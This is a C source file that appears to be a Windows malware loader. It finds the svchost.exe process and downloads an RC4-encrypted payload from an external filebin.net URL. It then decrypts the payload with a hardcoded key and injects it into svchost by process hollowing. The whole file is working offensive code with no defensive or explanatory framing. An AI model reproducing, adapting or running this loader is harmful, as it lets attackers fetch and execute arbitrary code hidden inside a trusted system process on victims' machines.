#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "debug.h"
#include "rc4.h"
#include "native.h"

unsigned char key[] = "mysecretkey12345";

int main() {
    DWORD dwBytesRead = 0;
    HANDLE hProcess = NULL;
    LPCWSTR sourceURL = L"https://filebin.net/9tvhx1mfxu87m5tx/calc.bin";
    PBYTE pBytes = NULL, pTmpBytes = NULL;
    SIZE_T sSize = 0;
    HINTERNET hInet = NULL, hURL = NULL;
    unsigned int keylen = strlen((const char*)key);
    BOOL success = FALSE;


    DWORD dwPID = FindProcessID(L"svchost.exe");

    LOG_INFO("Attempting to open a handle to the provided process (%lu)\n", dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL) {
        LOG_ERROR("Could not open a handle to the provided process, error: %ld", GetLastError());
        goto cleanup;
    }

    LOG_SUCCESS("Successfully opened a handle to the provided process.\n\\---0x%p", hProcess);

    hInet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInet == NULL) {
        LOG_ERROR("Could not open a handle to hInet... Error: %ld", GetLastError());
        goto cleanup;
    }

    LOG_SUCCESS("Successfully opened a handle to WinInet\n");

    LOG_INFO("Attempting to open a handle to the payload stage\n");
    hURL = InternetOpenUrlW(hInet, sourceURL, NULL, 0, INTERNET_FLAG_HYPERLINK, 0);
    if (hURL == NULL) {
        LOG_ERROR("Could not open a handle to payload stage\n");
        goto cleanup;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        LOG_ERROR("Failed to allocate memory for temp buffer");
        goto cleanup;
    }

    LOG_SUCCESS("Successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);

    while (TRUE) {
        if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
            LOG_ERROR("Could not read contents of specified file... Error: %ld", GetLastError());
            goto cleanup;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
        } else {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            LOG_ERROR("Failed to allocate memory for final buffer");
            goto cleanup;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    LOG_SUCCESS("Successfully downloaded the payload\n");

    LOG_INFO("Decrypting downloaded payload\n");
    rc4(key, keylen, pBytes, sSize);

    LOG_INFO("Attempting to hollow the process and inject the payload\n");
    success = HollowProcess(hProcess, pBytes, sSize);
    if (!success) {
        LOG_ERROR("Failed to hollow the process and inject the payload");
        goto cleanup;
    }

    LOG_SUCCESS("Successfully hollowed the process and injected the payload\n");

cleanup:
    if (pBytes) LocalFree(pBytes);
    if (pTmpBytes) LocalFree(pTmpBytes);
    if (hURL) InternetCloseHandle(hURL);
    if (hInet) InternetCloseHandle(hInet);
    if (hProcess) CloseHandle(hProcess);

    return success ? 0 : 1;
}
